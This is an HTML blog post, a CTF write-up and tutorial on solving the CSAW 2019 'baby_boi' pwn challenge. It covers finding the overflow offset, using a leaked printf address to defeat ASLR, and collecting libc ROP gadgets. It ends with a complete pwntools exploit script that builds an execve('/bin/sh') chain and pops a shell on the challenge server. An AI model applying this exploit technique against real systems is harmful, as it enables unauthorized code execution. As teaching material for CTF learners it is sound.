@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="utf-8" />
+	
+	<title>baby_boi (A Textbook CTF ROP Tutorial)</title>
+	
+
+
+
+
+<meta name="author" content="betaveros" />
+<meta name="description" content=" Welcome to pwn.
+nc pwn.chal.csaw.io 1005
+ Ahhh, CSAW CTF. Amidst all the other CTFs where we’re competing with security professionals who probably have decades of experience and who follow security developments for a living or whatever, there remains a competition where scrubs like me can apply our extremely basic CTF skills and still feel kinda smart by earning points. Now that I’ve graduated and am no longer eligible, our team was pretty small and I didn’t dedicate the full weekend to the CTF, but it means I got to do the really easy challenges in the categories that I was the worst at, by which I mean pwn.
+baby_boi is pretty much the simplest possible modern ROP (the modern security protections NX and ASLR are not artificially disabled, but you get everything you need to work around them). We even get source code.
+#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main(int argc, char **argv[]) { char buf[32]; printf(&amp;quot;Hello!\n&amp;quot;); printf(&amp;quot;Here I am: %p\n&amp;quot;, printf); gets(buf); } So there’s nothing novel here for experienced pwners, but I feel like there is a shortage of tutorials that walk you through how to solve a textbook ROP the way you’d want to solve it in a CTF, so here is a writeup.
+" />
+
+
+
+<meta name="generator" content="Hugo 0.56.0-DEV" />
+
+
+<link rel="canonical" href="//blog.vero.site/post/baby-boi" />
+<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+<link rel="stylesheet" href="/css/bundle.css" />
+<link rel="stylesheet" href="/katex/katex.min.css" />
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+</head>
+<body><div id="wrapper">
+<header class="site-header">
+	
+	<h2 class="title"><a href="/">Bounded-Error Log</a></h2>
+	
+	<p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
+	<button class="menu-toggle" type="button" aria-label="Toggle Menu">
+		<span class="icon icon-menu" aria-hidden="true"></span>
+	</button>
+	<nav class="site-menu collapsed">
+		<h2 class="offscreen">Main Menu</h2>
+		<ul class="menu-list">
+			
+			
+			
+			
+			<li class="menu-item "><a href="/about">About</a></li>
+			
+			<li class="menu-item "><a href="/category/life">Life</a></li>
+			
+			<li class="menu-item "><a href="/category/thoughts">Thoughts</a></li>
+			
+			<li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li>
+			
+			<li class="menu-item "><a href="/category/math">Math</a></li>
+			
+			<li class="menu-item "><a href="/category/cs">CS</a></li>
+			
+			<li class="menu-item "><a href="/category/puzzles">Puzzles</a></li>
+			
+			<li class="menu-item "><a href="/category/meta">Meta</a></li>
+			
+			<li class="menu-item "><a href="/util">Utilities</a></li>
+			
+			<li class="menu-item "><a href="/all">All Posts</a></li>
+			
+		</ul>
+	</nav>
+	<nav class="social-menu collapsed">
+		<h2 class="offscreen">Social Networks</h2>
+		<ul class="social-list">
+
+			
+
+			
+			<li class="social-item">
+				<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
+			</li>
+
+			
+
+			<li class="social-item">
+				<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
+			</li>
+
+		</ul>
+	</nav>
+</header>
+
+<section class="main post-detail">
+	<header>
+		<h1 class="post-title">baby_boi (A Textbook CTF ROP Tutorial)</h1>
+		
+		<h2 class="post-subtitle">CSAW CTF Qualifiers 2019</h2>
+		
+		<p class="post-meta">
+		
+		2019-09-15
+		(1702 words)
+		
+		<span class="post-categories">
+			filed under
+			<a href="/category/cs">CS</a>
+		</span>
+		
+		</p>
+	</header>
+	<article><blockquote>
+<p>Welcome to pwn.</p>
+<p><code>nc pwn.chal.csaw.io 1005</code></p>
+</blockquote>
+<p>Ahhh, CSAW CTF. Amidst all the other CTFs where we’re competing with security professionals who probably have decades of experience and who follow security developments for a living or whatever, there remains a competition where scrubs like me can apply our extremely basic CTF skills and still feel kinda smart by earning points. Now that I’ve graduated and am no longer eligible, our team was pretty small and I didn’t dedicate the full weekend to the CTF, but it means I got to do the really easy challenges in the categories that I was the worst at, by which I mean pwn.</p>
+<p><code>baby_boi</code> is pretty much the simplest possible modern ROP (the modern security protections NX and ASLR are not artificially disabled, but you get everything you need to work around them). We even get source code.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" data-line-number="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
+<a class="sourceLine" id="cb1-2" data-line-number="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
+<a class="sourceLine" id="cb1-3" data-line-number="3"></a>
+<a class="sourceLine" id="cb1-4" data-line-number="4"><span class="dt">int</span> main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv[]) {</a>
+<a class="sourceLine" id="cb1-5" data-line-number="5">  <span class="dt">char</span> buf[<span class="dv">32</span>];</a>
+<a class="sourceLine" id="cb1-6" data-line-number="6">  printf(<span class="st">&quot;Hello!</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
+<a class="sourceLine" id="cb1-7" data-line-number="7">  printf(<span class="st">&quot;Here I am: %p</span><span class="sc">\n</span><span class="st">&quot;</span>, printf);</a>
+<a class="sourceLine" id="cb1-8" data-line-number="8">  gets(buf);</a>
+<a class="sourceLine" id="cb1-9" data-line-number="9">}</a></code></pre></div>
+<p>So there’s nothing novel here for experienced pwners, but I feel like there is a shortage of tutorials that walk you through how to solve a textbook ROP the way you’d want to solve it in a CTF, so here is a writeup.</p>
+<p>As I said, pwns are really not the CTF category I contribute to, which is why this is only the second ROP I did in an actual contest. But since I wrote up <a href="//blog.vero.site/post/plc">my first ROP (PLC)</a> with some conceptual detail and there are zillions of other ROP tutorials on the internet, I will assume understanding of how ROP works conceptually and just focus on the technical execution.</p>
+<h3 id="setup">Setup</h3>
+<p>Here are all the tools we need:</p>
+<ul>
+<li>A Linux machine. A VM is fine. You might want one even if your machine is already running Linux, so that you reduce the chances of CTF stuff messing with the rest of your machine.</li>
+<li>Python, and the Python library <a href="https://github.com/Gallopsled/pwntools#readme"><code>pwntools</code></a>, which is the library everybody and their mom use for interacting with binaries in CTFs. It’s extremely useful. As of time of writing it’s Python 2 only; there exists a <a href="https://github.com/arthaud/python3-pwntools">Python 3</a> fork that is no longer maintained, but also works well enough. I wrote my script against the Python 3 fork, but the differences from Python 2 are small. (Hopefully we’ll have a supported Python 3 version before Python 2 stops being supported…) It also comes with a few very useful command-line utilities, particularly <code>checksec</code>.</li>
+<li>The Python utility <a href="https://github.com/JonathanSalwan/ROPgadget"><code>ROPgadget</code></a>, which we will use for finding ROP gadgets.</li>
+<li>(optional because it didn’t work, but useful to know) The Ruby utility <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>.</li>
+<li>Some other utilities that I think might come with Linux, but if not you should know what to Google: <code>file</code>, <code>gdb</code>, <code>readelf</code>, <code>strings</code>. In general I’d suggest setting up <code>gdb</code> with <a href="https://github.com/pwndbg/pwndbg"><code>pwndbg</code></a> and <a href="https://github.com/snare/voltron"><code>voltron</code></a>, but I don’t think you need anything other than basic <code>gdb</code> functionality (if that) for this challenge.</li>
+</ul>
+<p>Okay, let’s get ROPping.</p>
+<h3 id="recon">Recon</h3>
+<p>The first thing to do is download the executable and libc. The second thing to do is probably run the basic diagnostic utilities against it, just to see what we’re up against. (<code>checksec</code> comes with <code>pwntools</code>.)</p>
+<pre class="wrap"><code>$ file baby_boi
+baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=065da8fff74608a5758babd74e18e7e046054d84, not stripped</code></pre>
+<pre><code>$ checksec baby_boi
+[*] &#39;/home/akriloth/Dropbox/prog/ctf/csaw/2019/baby_boi&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE</code></pre>
+<p>Nothing unusual. NX is on, so we can’t shellcode, but that’s what we’d expect anyway; the other protections are not strong, so we don’t need to worry about them.</p>
+<h3 id="stack-smashing">Stack Smashing</h3>
+<p><code>gets</code> lets us smash the stack as far as we want, but one thing we always need to know is how far down the stack the first return address we can smash is, so we know how much padding to add. You can be a diligent, disciplined hacker and count how much memory is allocated on the stack (32 bytes, for <code>buf</code>) and add the 8 bytes used to store the old <code>ebp</code>, but get the answer. You can also do it the dumb but foolproof way by opening <code>gdb</code>, running it against input like <code>aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggg</code>, observing which address the executable segfaults on, and looking for which ASCII character it comprises.</p>
+<p>However you decide to find out, you should conclude that we have to pad 40 bytes before the return address.</p>
+<h3 id="leaking-libc">Leaking libc</h3>
+<p>In more advanced challenges, to defeat ASLR, you have to first do a buffer overread or something else to leak an address in libc. Here, though, the libc leak is handed to us on a silver platter, in the form of a pointer to <code>printf</code>. A typical interaction will give something like:</p>
+<pre><code>$ nc pwn.chal.csaw.io 1005
+Hello!
+Here I am: 0x7f3c0a0b3e80</code></pre>
+<p>Let’s figure out its offset in libc, by grepping the output of <code>readelf</code> on the provided libc:</p>
+<pre><code>$ readelf -s libc-2.27.so | grep &#39; printf@&#39;
+   627: 0000000000064e80   195 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5</code></pre>
+<p>So <code>printf</code> is at offset <code>0x64e80</code> in the server’s libc. (As confirmation that this is correct, you’ll note that the last three hex digits are the same as the address we got above, because ASLR only randomizes addresses with a granularity of <code>0x1000</code>.) Therefore, we can calculate the runtime address of anything else in libc by taking the pointer we’re given, subtracting <code>0x64e80</code>, and adding the fixed offset calculated from our copy of libc.</p>
+<h3 id="building-the-rop-chain">Building the ROP Chain</h3>
+<p>Let’s use <code>ROPgadget</code> to look for gadgets. We’ll pick out the ones we want later. (This might take a few seconds or minutes, so we’d want to save the results into a text file and search it with our favorite text editor.)</p>
+<pre><code>$ ROPgadget --binary libc-2.27.so &gt; gadgets.txt</code></pre>
+<p>Recall the bog-standard ROP payload, exactly the same I used in <a href="//blog.vero.site/post/plc">PLC</a>: we want to call the syscall <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>, which gives us a shell, so we want to:</p>
+<ul>
+<li>set <code>rax</code> to the syscall number of <code>execve</code> (on a 64-bit machine), which is 59 or <code>0x3b</code>;</li>
+<li>set <code>rdi</code> to a pointer to the string “/bin/sh”;</li>
+<li>set <code>rdx</code> to 0;</li>
+<li>set <code>rsi</code> to 0.</li>
+</ul>
+<p>Our stack smash is powerful enough that we don’t have to worry about anything like avoiding null bytes in our chain, so the simplest, most reliably findable ROP gadgets we can to use to achieve our goal are just <code>pop</code> instructions for each of these registers. So, you can fire up favorite text editor and look in <code>gadgets.txt</code> for useful gadgets. For example, you can find the <code>pop rax ; ret</code> gadget (if one exists) with a regex search for <code>: pop rax ; ret$</code>. It does exist:</p>
+<pre><code>0x00000000000439c8 : pop rax ; ret</code></pre>
+<p>This gadget is at offset <code>0x439c8</code>. For the full exploit, we decide that we want to set up the stack like this (top to bottom), where parentheses denote the location of the ROP gadget. This also happens to be the exact same setup as in PLC, conveniently. (We could just as well have used separate <code>pop rdx ; ret</code> and <code>pop rsi ; ret</code> gadgets, but given that we managed to find a gadget that does both, there’s no reason not to use it.)</p>
+<pre><code>(pop rax ; ret)
+0x3b
+(pop rdi ; ret)
+(pointer to &quot;/bin/sh&quot;)
+(pop rdx ; pop rsi ; ret)
+0
+0
+(syscall)</code></pre>
+<p>As above, all the locations of the gadgets are in <code>gadgets.txt</code>, so we just need to write down their offsets:</p>
+<pre><code>0x00000000000439c8 : pop rax ; ret
+0x000000000002155f : pop rdi ; ret
+0x00000000001306d9 : pop rdx ; pop rsi ; ret
+0x00000000000d2975 : syscall ; ret</code></pre>
+<p>The one thing we still need to look up is the string <code>/bin/sh</code>. You can find it with the following command.</p>
+<pre><code>$ strings -tx libc-2.27.so | grep /bin/sh
+ 1b3e9a /bin/sh</code></pre>
+<p>(<code>-t</code> prints positions; with <code>x</code> as its argument, the positions are formatted in hexadecimal.)</p>
+<h3 id="sidebar-one_gadget">Sidebar: <code>one_gadget</code></h3>
+<p>When you have control of one return address, <code>one_gadget</code> is usually worth checking. It identifies single locations you can jump to that might give you a shell directly, with no further gadgets, if other constraints are also satisfied. It’s often faster to just try jumping to them and seeing if you get a shell, instead of manually seeing if the constraints are satisfied. In this case I don’t think they were.</p>
+<pre><code>$ one_gadget libc-2.27.so
+0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  rcx == NULL
+
+0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre>
+<h3 id="the-full-exploit">The Full Exploit</h3>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb12-1" data-line-number="1"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb12-2" data-line-number="2"></a>
+<a class="sourceLine" id="cb12-3" data-line-number="3"><span class="co"># One of the many magic things pwntools does is that you can accept arguments</span></a>
+<a class="sourceLine" id="cb12-4" data-line-number="4"><span class="co"># from the environment or command line with zero setup, e.g. run this script as</span></a>
+<a class="sourceLine" id="cb12-5" data-line-number="5"><span class="co">#</span></a>
+<a class="sourceLine" id="cb12-6" data-line-number="6"><span class="co">#     $ python exploit.py REMOTE</span></a>
+<a class="sourceLine" id="cb12-7" data-line-number="7"><span class="co">#</span></a>
+<a class="sourceLine" id="cb12-8" data-line-number="8"><span class="co"># to run it against the remote server, or don&#39;t pass REMOTE to run it locally.</span></a>
+<a class="sourceLine" id="cb12-9" data-line-number="9"></a>
+<a class="sourceLine" id="cb12-10" data-line-number="10"><span class="cf">if</span> args[<span class="st">&#39;REMOTE&#39;</span>]:</a>
+<a class="sourceLine" id="cb12-11" data-line-number="11">    conn <span class="op">=</span> remote(<span class="st">&#39;pwn.chal.csaw.io&#39;</span>, <span class="dv">1005</span>)</a>
+<a class="sourceLine" id="cb12-12" data-line-number="12"><span class="cf">else</span>:</a>
+<a class="sourceLine" id="cb12-13" data-line-number="13">    conn <span class="op">=</span> process(<span class="st">&#39;baby_boi&#39;</span>)</a>
+<a class="sourceLine" id="cb12-14" data-line-number="14"></a>
+<a class="sourceLine" id="cb12-15" data-line-number="15"><span class="co"># conn.recvuntil(&quot;some string&quot;) is often more useful, but the input here</span></a>
+<a class="sourceLine" id="cb12-16" data-line-number="16"><span class="co"># doesn&#39;t have a super obvious terminator, so we read line by line.</span></a>
+<a class="sourceLine" id="cb12-17" data-line-number="17">conn.recvline()</a>
+<a class="sourceLine" id="cb12-18" data-line-number="18">ptr_line <span class="op">=</span> conn.recvline()</a>
+<a class="sourceLine" id="cb12-19" data-line-number="19">ptr_text <span class="op">=</span> re.search(<span class="vs">r&#39;0x([0-9a-z]+)&#39;</span>, ptr_line.decode(<span class="st">&#39;utf-8&#39;</span>)).group(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb12-20" data-line-number="20">printf_ptr <span class="op">=</span> <span class="bu">int</span>(ptr_text, <span class="dv">16</span>)</a>
+<a class="sourceLine" id="cb12-21" data-line-number="21">libc_base <span class="op">=</span> printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span></a>
+<a class="sourceLine" id="cb12-22" data-line-number="22"></a>
+<a class="sourceLine" id="cb12-23" data-line-number="23"><span class="co"># The ROP chain, using these offsets as found above:</span></a>
+<a class="sourceLine" id="cb12-24" data-line-number="24"><span class="co"># 0x00000000000439c8 : pop rax ; ret</span></a>
+<a class="sourceLine" id="cb12-25" data-line-number="25"><span class="co"># 0x000000000002155f : pop rdi ; ret</span></a>
+<a class="sourceLine" id="cb12-26" data-line-number="26"><span class="co"># 0x00000000001306d9 : pop rdx ; pop rsi ; ret</span></a>
+<a class="sourceLine" id="cb12-27" data-line-number="27"><span class="co"># 0x1b3e9a /bin/sh</span></a>
+<a class="sourceLine" id="cb12-28" data-line-number="28"><span class="co"># 0x00000000000d2975 : syscall ; ret</span></a>
+<a class="sourceLine" id="cb12-29" data-line-number="29">exploit <span class="op">=</span> b<span class="st">&quot;a&quot;</span> <span class="op">*</span> <span class="dv">40</span> <span class="co"># padding</span></a>
+<a class="sourceLine" id="cb12-30" data-line-number="30">exploit <span class="op">+=</span> p64(libc_base <span class="op">+</span> <span class="bn">0x439c8</span>) <span class="co"># `pop rax ; ret`</span></a>
+<a class="sourceLine" id="cb12-31" data-line-number="31">exploit <span class="op">+=</span> p64(<span class="dv">59</span>) <span class="co"># execve&#39;s syscall number, popped into rax</span></a>
+<a class="sourceLine" id="cb12-32" data-line-number="32">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x2155f</span>) <span class="co"># `pop rdi ; ret`</span></a>
+<a class="sourceLine" id="cb12-33" data-line-number="33">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x1b3e9a</span>) <span class="co"># &quot;/bin/sh&quot;</span></a>
+<a class="sourceLine" id="cb12-34" data-line-number="34">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0x1306d9</span>) <span class="co"># `pop rdx ; pop rsi ; ret`</span></a>
+<a class="sourceLine" id="cb12-35" data-line-number="35">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rdx</span></a>
+<a class="sourceLine" id="cb12-36" data-line-number="36">exploit <span class="op">+=</span> p64(<span class="dv">0</span>) <span class="co"># NULL, popped into rsi</span></a>
+<a class="sourceLine" id="cb12-37" data-line-number="37">exploit <span class="op">+=</span> p64(printf_ptr <span class="op">-</span> <span class="bn">0x64e80</span> <span class="op">+</span> <span class="bn">0xd2975</span>) <span class="co"># `syscall; ret`</span></a>
+<a class="sourceLine" id="cb12-38" data-line-number="38">exploit <span class="op">+=</span> b<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span></a>
+<a class="sourceLine" id="cb12-39" data-line-number="39"></a>
+<a class="sourceLine" id="cb12-40" data-line-number="40"><span class="co"># Send the exploit</span></a>
+<a class="sourceLine" id="cb12-41" data-line-number="41">conn.sendline(exploit)</a>
+<a class="sourceLine" id="cb12-42" data-line-number="42"><span class="co"># This should pop a shell, so now let us interact with the shell</span></a>
+<a class="sourceLine" id="cb12-43" data-line-number="43">conn.interactive()</a></code></pre></div>
+<p>And, the fun part:</p>
+<pre><code>$ python3 exploit.py REMOTE
+[+] Opening connection to pwn.chal.csaw.io on port 1005: Done
+[*] Switching to interactive mode
+$ ls
+baby_boi
+flag.txt
+$ cat flag.txt
+flag{baby_boi_dodooo_doo_doo_dooo}</code></pre></article>
+	<footer class="post-footer">
+		
+		<ul class="post-tags">
+			
+			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
+			
+			<li><a href="/tag/x86"><span class="tag">X86</span></a></li>
+			
+		</ul>
+		
+	</footer>
+	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
+	<section id="isso-thread"></section>
+	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
+	
+	
+	
+	<footer class="post-footer">
+		<nav class="pagination">
+			
+			<a class="pagination-previous" href="//blog.vero.site/post/puzzlehunts">← Introduction to Puzzlehunts</a>
+			
+			
+		</nav>
+	</footer>
+</section>
+<footer class="site-footer">
+	<p>© 2017-2019 betaveros, Bounded-Error Log</p>
+	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
+	<a href="https://posativ.org/isso/">Isso</a>,
+	<a href="https://pages.github.com/">GitHub Pages</a>, and
+	<a href="https://www.cloudflare.com/">CloudFlare</a>.
+	</p>
+</footer>
+
+
+
+
+<script src="/katex/katex.min.js"></script>
+<script src="/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body);</script>
+<script src="/js/bundle.js"></script>
+<script src="/js/jquery-3.2.1.min.js"></script>
+
+
+</div></body>
+</html>
